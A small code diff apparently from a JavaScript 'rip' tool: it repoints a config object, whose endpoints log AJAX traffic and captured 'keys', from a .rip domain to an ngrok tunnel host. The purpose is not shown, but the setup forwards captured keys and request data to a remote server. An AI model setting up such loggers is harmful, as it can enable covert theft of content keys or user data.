@@ -3,7 +3,7 @@ window.keys = {}
 window.rip_configs = {
   ajax_logger: "/api/ajax-logger",
   keys_logger: "/api/keys-logger",
-  host: "https://usercontents.fuhuzz.rip",
+  host: "https://eel-moral-ape.ngrok-free.app",
 }
 
 async function load_segment(url) {
